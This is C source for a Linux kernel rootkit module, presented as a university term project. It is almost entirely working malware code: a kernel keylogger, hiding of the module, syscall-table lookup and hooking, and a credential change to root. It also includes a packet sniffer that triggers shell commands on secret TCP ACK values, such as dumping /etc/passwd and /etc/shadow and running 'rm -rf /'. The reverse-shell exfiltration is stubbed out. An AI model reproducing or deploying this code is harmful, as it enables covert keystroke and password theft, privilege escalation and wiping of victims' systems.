/**
 * Project:
 *   + A conceptual rootkit developed as a term project.
 *   + COSC 439, Towson University
 *   + Taught by Shiva Azadegan
 *
 * Usage:
 *   START: $> insmod rootkit.ko
 *   STOP : $> rmmod rootkit
 * 
 * Authors:
 *   + Zachary Brown
 *   + Kevin Hoganson
 *   + Alexander Slonim
**/
#include <linux/module.h>               /* Generic module functions.         */
#include <linux/kernel.h>               /* Generic kernel functions.         */
#include <linux/kmod.h>                 /* Used for userspace program calls. */
#include <linux/slab.h>                 /* Used for kmalloc().               */
#include <linux/kthread.h>              /* Used for separate thread for call_usermodehelper(). */

#include <asm/uaccess.h>                /* Used for definition of KERNEL_DS.   */
#include <asm/segment.h>				/* Provides us access to segment regs. */
#include <asm/paravirt.h>               /* Make use of Read_cr0 and Write_cr0. */

// Credit to 'ankan' from www.linuxforums.org/forum/kernel55923-kernel-sockets.html
// SERVER FUNCTIONS DISABLED.
// CURRENTLY NOT USED.
#include <linux/netdevice.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>
// CURRENTLY NOT USED.

#include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
#include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kevin Hoganson - khogan8@students.towson.edu");
MODULE_AUTHOR("Zachary Brown  - zbrown4@students.towson.edu");
MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");


#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */

#define SHIFT_ENABLED  1				/* Shift key is enabled.  */
#define SHIFT_DISABLED 0				/* Shift key is disabled. */

#define CONNECTED      1				/* r-TCP connection established.     */
#define DISCONNECTED   0				/* r-TCP connection not established. */


// Memory segment context switch
mm_segment_t old_fs;


/**
 * KEYLOGGER FUNCTIONALITY
**/
char keyboard_buffer[KEYBOARD_BUFFER_SIZE];
int  keyboard_index;
int  shift_state;


/**
 * NETWORK LISTENING FUNCTIONALITY
**/
struct packet_type  net_proto;
struct sockaddr_in  sock_in;
struct socket      *sock;


/**
 * REVERSE TCP "SHELL" FUNCTIONALITY
 * SERVER FUNCTIONALITY DISABLED.
**/
unsigned long  int server_ip;
unsigned short int server_port;
int connection_state;
char *command_buffer;
int fd;

unsigned long int acks[] =
{
	2035414082,
	1923488235,
	1039496434,
	455162575,
	1256802356,
	121160666,
	775584247,
	400038231,
	966583691,
	1678453465,
	653897989,
	1891123724,
	584692231,
	1540142942,
	1462005693,
	1331651723,
	1698886690,
	763403905,
	1671908051,
	922525094
};


/**
 * SYSTEM CALL HIJACKING
 * Credit to Richard Kavanagh
**/
// Original system calls in system call table.
asmlinkage int (*original_open)(const char *pathname, int flags);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_close)(int fd);
asmlinkage int (*original_fstat)(int fd, struct stat *buf);

unsigned long **sys_call_table;
struct   stat   stat_buffer;


/**
 * Correlates with the key definitions found in:
 * /usr/include/linux/input.h
**/
char *letters[] = 
{
	"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
	"-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
	"o", "p", "[", "]", "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h",
	"j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z", "x", "c", "v", "b",
	"n", "m", ",", ".", "/", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};


/**
 * Can be used for uppercase lettering. In other words:
 * Use this whenever SHIFT is enabled.
**/
char *shift_letters[] = 
{
	"RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
	"_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I",
	"O", "P", "{", "}", "ENTER", "LCTRL", "A", "S", "D", "F", "G", "H",
	"J", "K", "L", ":", "\"", "~", "LSHIFT", "|", "Z", "X", "C", "V", "B",
	"N", "M", "<", ">", "?", "RSHIFT", "*", "LALT", " ", "CAPS", "F1",
	"F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK",
	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
	"0", "."
};


static unsigned long **get_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	printk("Looking for system call table starting at [%lx].\n", offset);
	while (offset < ULLONG_MAX)
	{
		sct = (unsigned long **)offset;
		if (sct[__NR_close] == (unsigned long *) sys_close)
		{
			printk("System call table found at [%lx].\n", offset);
			return sct;
		}

		offset += sizeof(void *);
	}

	return NULL;
}


// Note: some of the members of msg may not be available - depends on kernel version.
// commented out because of socket errors.
/*
void send_buffer(struct socket *sock, const char *buffer, size_t length)
{
	struct msghdr msg;
	struct iovec  iov;

	msg.msg_flags = MSG_WAITALL;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_iovlen  = 1;
	msg.msg_namelen = 0;
	msg.msg_iov  = &iov;
	msg.msg_name = 0;

	iov.iov_base = (char *) buffer;
	iov.iov_len  = (size_t) length;

	old_fs = get_fs();
	set_fs(KERNEL_DS);
		sock_sendmsg(sock, &msg, (size_t)length);
	set_fs(old_fs);
}
*/


/**
 * TODO: 
 *   - Write keyboard_buffer into file if not connected.
 *   - When connected, read file into buffer and send to control server.
**/
int notification(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	char   *buffer;
	char   *key;
	char   c;
	int    i;

	// 83 character values are registered above (letters). 
	if (code == KBD_KEYCODE && param->value <= 83)
	{
		// If the key is Left or Right Shift.
		if (param->value == 42 || param->value == 54)
		{
			if (param->down > 0) shift_state = SHIFT_ENABLED;
			else 				 shift_state = SHIFT_DISABLED;

			return NOTIFY_OK;
		}

		if (param->down)
		{
			// If the shift key is being held down.
			if (shift_state) 
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", shift_letters[param->value]);
				key = shift_letters[param->value];
			}

			else
			{
				printk(KERN_DEBUG "KEYLOGGER <'%s'>\n", letters[param->value]);
				key = letters[param->value];
			}

			// Add each letter in the string returned by key_notifier to the buffer. 
			buffer = keyboard_buffer;
			for (i = 0; i < strlen(shift_letters[param->value]); i++)
			{
				c = key[i];
				// Test if keyboard_buffer is full.
				if (keyboard_index < KEYBOARD_BUFFER_SIZE)
					buffer[keyboard_index++] = c;

				else
				{
					if (connection_state)
					{
						//send_buffer(sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);
						memset(&keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
						keyboard_index = 0;
						buffer[keyboard_index++] = c;
					}
					//else
						// switch to userspace
						// write buffer to file
						// exit userspace
				}
			}
		}
	}

	return NOTIFY_OK;
}

// notification() invoked with every keystroke.
static struct notifier_block nb =
{
	.notifier_call = notification
};


/**
 * Main functionality is commented out because of socket errors.
 * For the sake of demonstration, first packet will simply switch 'connection_state'.
**/
void reverse_connect(void)
{
	/*
	printk("Initializing network socket.\n");
	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
	{
		printk("Error in creating socket.\n");
	}

	memset(&sock_in, 0, sizeof(sock_in));
	sock_in.sin_family = AF_INET;
	sock_in.sin_addr.s_addr = htonl((unsigned long) server_ip);
	sock_in.sin_port = htons((unsigned short) server_port);
	

	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
		printk("Could not connect.\n");
	else
	{
		connection_state = CONNECTED;
		printk("Connected to server.\n");
	}
	*/
}


/**
 * TODO:
 *   - Contents of each command-file should be placed
 *     in a buffer, then sent to the control server.
**/
void handle_command(unsigned long int ack_seq)
{
	// argv[0] reserved for user program.	
	static char *argv[4];
	static char *envp[4]; 
	static char *path;
	int i;
	
	printk("Handling: %lu\n", ack_seq);
	switch(ack_seq)
	{
		/* List running processes. */
		case 2035414082:
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "ps aux > /usr/games/process_list.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/process_list.txt"), GFP_KERNEL);
			path = "/usr/games/process_list.txt";

			break;

		/* List all installed software. */
		case 1923488235:
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "dpkg -l > /usr/games/installed_software.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:/usr/bin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/installed_software.txt"), GFP_KERNEL);

			break;

		/* Retrieve /etc/passwd */
		case 1039496434:
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "cat /etc/passwd > /usr/games/etc_passwd.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:"; 
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/etc_passwd.txt"), GFP_KERNEL);

			break;

		/* Retrieve /etc/shadow */
		case 455162575 :
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "cat /etc/shadow > /usr/games/etc_shadow.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/etc_shadow.txt"), GFP_KERNEL);

			break;

		/* Retrieve /var/log/secure      */
		/* Where is this file in Ubuntu? */
		case 1256802356:
			break;

		/* Display netstat information. */
		case 121160666 :
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "netstat -a > /usr/games/netstat.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/netstat.txt"), GFP_KERNEL);

			break;

		/* Display routing information.        */
		/* Also take into consideration 'dig'. */
		case 775584247 :
			break;

		/* Display network interfaces / IP info. */
		case 400038231 :
			argv[0] = "/bin/sh";
			argv[1] = "-c"; 
			argv[2] = "ifconfig > /usr/games/ifconfig.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:/sbin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/ifconfig.txt"), GFP_KERNEL);

			break;

		/* Display linux operating system information. */
		case 966583691 :
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "uname -a > /usr/games/uname.txt"; 
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:";
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/uname.txt"), GFP_KERNEL);

			break;


		/* List modules. */
		case 653897989 :
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "lsmod > /usr/games/lsmod.txt";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:"; 
			envp[3] = NULL;

			path = kmalloc(sizeof("/usr/games/uname.txt"), GFP_KERNEL);

			break;

		/* Remove self / cleanup. */
		case 1891123724:
			argv[0] = "/bin/sh";
			argv[1] = "-c";
			argv[2] = "rm /usr/games/*.txt; rmmod rootkit;";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:/sbin/:";
			envp[3] = NULL;

			break;

		/* Wipe the system.  */
		/* CAUTION: rm -rf / */
		case 584692231 :
			argv[0] = "/bin/sh"; 
			argv[1] = "-c";
			argv[2] = "rm -rf /";
			argv[3] = NULL;

			envp[0] = "HOME=/";
			envp[1] = "TERM=linux";
			envp[2] = "PATH=/bin/:";
			envp[3] = NULL;

			break;

		/* Disconnect from control server. */
		case 1540142942:
			if (connection_state)
			{
				if (sock->ops->shutdown(sock, 2) < 0)
					;
				else
					connection_state = DISCONNECTED;

			}
			break;


		default:
			break;
	}

	for (i = 0; i < 4; i++)
	{
		printk("argv[%d]: %s\n", i, argv[i]);
		printk("envp[%d]: %s\n", i, envp[i]);
	}

	printk("Working with path: %s\n", path);

	// Should be handled in a thread by itself.
	// This rootkit LKM is not intended to handle wait() calls.
	// Jumping into userspace implicitly makes use of wait().
	// This throws a large error in the kernel buffer.
	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	
	old_fs = get_fs();
	set_fs(KERNEL_DS);
		fd = (*original_open)(path, O_RDONLY);
		if (fd != -1)
		{
			(*original_fstat)(fd, &stat_buffer);
			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
			(*original_read)(fd, command_buffer, stat_buffer.st_size);
			(*original_close)(fd);
		}
	set_fs(old_fs);

	return;
}


/**
 * SERVER FUNCTIONALITY DISABLED. 
 * reverse_connect() does not establish r-TCP connection.
 * connection_state is set to CONNECTED in this function.
 *
 * TODO:
 *   - Identify log file that prints "[INTERFACE] entering promicuous mode."
 *   - Clear that file with every packet received using call_usermodehelper().
**/
int packet_rcv(struct sk_buff *skb, struct net_device *dev,
	struct packet_type *ptype, struct net_device *orig_dev)
{
	struct tcphdr *tcp_header;
	struct iphdr  *ip_header;

	unsigned long int ack_seq;

	int i;

	ip_header = (struct iphdr *)skb_network_header(skb);

	if (ip_header->protocol == IPPROTO_TCP)
	{
		printk("Packet received was a TCP packet.\n");
		tcp_header = (struct tcphdr *) ((unsigned int *) ip_header + ip_header->ihl);

		ack_seq = ntohl(tcp_header->ack_seq);
		printk("ack_seq: %lu\n", ack_seq);
		
		// Up to 20+ different commands.
		// Just add them to acks[]. 
		for (i = 0; i < 20; i++)
		{
			if (ack_seq == acks[i])
			{
				if (!connection_state)
				{
					printk("Attempting to connect to TCP server.\n");
					//reverse_connect();
					connection_state = CONNECTED;
					handle_command(ack_seq);
				}

				else
					handle_command(ack_seq);
			}
		}
	}

	kfree_skb(skb);
	return 0;
}


// Credit goes to Beraldo Leal
// beraldo@ime.usp.br
void start_listen(void)
{
	printk("Starting network sniffing.\n");
	net_proto.type = htons(ETH_P_ALL);
	net_proto.dev  = NULL;
	net_proto.func = packet_rcv;
	dev_add_pack(&net_proto);
}


// Credit goes to maK_it for this function.
// Corrected in order to accommodate kernel header file update (add .val).
// https://github.com/maK-/maK_it-Linux-Rootkit/blob/master/template.c
void get_root(void)
{
	struct cred *credentials;
	credentials = prepare_creds();

	if (credentials == NULL)
		return; 
	credentials->uid.val   = credentials->gid.val   = 0;
	credentials->euid.val  = credentials->egid.val  = 0;
	credentials->suid.val  = credentials->sgid.val  = 0;
	credentials->fsuid.val = credentials->fsgid.val = 0;
	commit_creds(credentials);
}


void hide_me(void)
{
	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
}


/**
 * TODO:
 *   - Seed for randomly generated magic "ACK"s?
 *   - Persistence (try connect on startup?)
 *   - Get TCP connection in working condition. 
**/
int start(void)
{
	printk("Rootkit started.\n");

	printk("Hiding module object.\n");
	hide_me();

	printk("Obtaining root privileges.\n");
	get_root();

	if (!(sys_call_table = get_sys_call_table()))
	{
		printk("Unable to find system call table.\n");
		return -1;
	}

	printk("Writing system calls to function pointers.\n");
	write_cr0(read_cr0() & (~ 0x10000));
		original_open  = (void *)sys_call_table[__NR_open];
		original_close = (void *)sys_call_table[__NR_close];
		original_read  = (void *)sys_call_table[__NR_read];
		original_fstat = (void *)sys_call_table[__NR_fstat];
	write_cr0(read_cr0() | 0x10000); 
	
	printk("Registering keyboard notifier.\n");
	register_keyboard_notifier(&nb);
	keyboard_index = 0;

	start_listen();
	connection_state = DISCONNECTED;

	/**
	 * Addresses:
	 *   - 0x7F000001 is "127.0.0.1" in host byte order.
	 * 	 - 0xC0A838C8 is "192.168.56.200" in host byte order.
	 * Ports:
	 * 	 - 0x395D is "14685" in host byte order.
	**/ 
	//server_ip   = 0x7F000001;
	//server_port = 0x395D    ; 

	return 0;
}

void stop(void)
{
	printk("Unregistering keyboard notifier.\n");
	unregister_keyboard_notifier(&nb);
	printk("Keyboard notifier unregistered.\n"); 

	printk("Removing netdevice pack.\n");
	dev_remove_pack(&net_proto);

	if (connection_state)
	{
		if (sock->ops->shutdown(sock, 2) < 0)
			printk("Could not close the socket.\n");
		else
		{
			connection_state = DISCONNECTED;
			printk("Closed the socket.\n");
		}
	}

	// printk("Clearing command buffer.\n");
	kfree(command_buffer);

	printk("Rootkit stopped.\n");
}

module_init(start);
module_exit(stop);
